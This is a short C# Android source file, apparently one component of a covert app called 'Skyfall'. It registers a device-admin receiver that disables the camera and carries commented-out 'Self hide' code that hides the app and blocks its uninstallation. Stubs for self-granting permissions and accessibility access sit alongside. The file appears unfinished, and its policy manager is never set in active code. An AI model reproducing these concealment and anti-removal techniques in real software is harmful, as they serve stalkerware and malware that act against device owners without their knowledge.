using Android.App;
using Android.App.Admin;
using Android.Content;
using Android.Widget;

namespace Skyfall
{
    [BroadcastReceiver(Permission = "android.permission.BIND_DEVICE_ADMIN", Name = "com.hygnus.skyfall.Admin")]
    [MetaData("android.app.device_admin", Resource = "@xml/deviceadminconfig")]
    [IntentFilter(new[] { "android.app.action.DEVICE_ADMIN_ENABLED", Intent.ActionMain })]
    public class Admin : DeviceAdminReceiver
    {
        public static DevicePolicyManager policyManager = null;
        public static ComponentName componentName = null;

        public override void OnProfileProvisioningComplete(Context context, Intent intent)
        {
            base.OnProfileProvisioningComplete(context, intent);

            policyManager.SetCameraDisabled(componentName, true);
        }

        public override void OnEnabled(Context context, Intent intent)
        {
            
            //policyManager = (DevicePolicyManager)Kernel.applicationContext.GetSystemService(Context.DevicePolicyService);
            //componentName = new ComponentName(Kernel.applicationContext, Java.Lang.Class.FromType(typeof(Admin)));

            /// Self hide ///
            //Admin.policyManager.SetApplicationHidden(Admin.componentName, Kernel.packageName, true);
            //Admin.policyManager.SetUninstallBlocked(Admin.componentName, Kernel.packageName, true);


            /// Grant self permissions ///

            /// Grant self accessibility (Kernel service) ///
            

            base.OnEnabled(context, intent);
        }

        public override void OnDisabled(Context context, Intent intent)
        {

        }
    }
}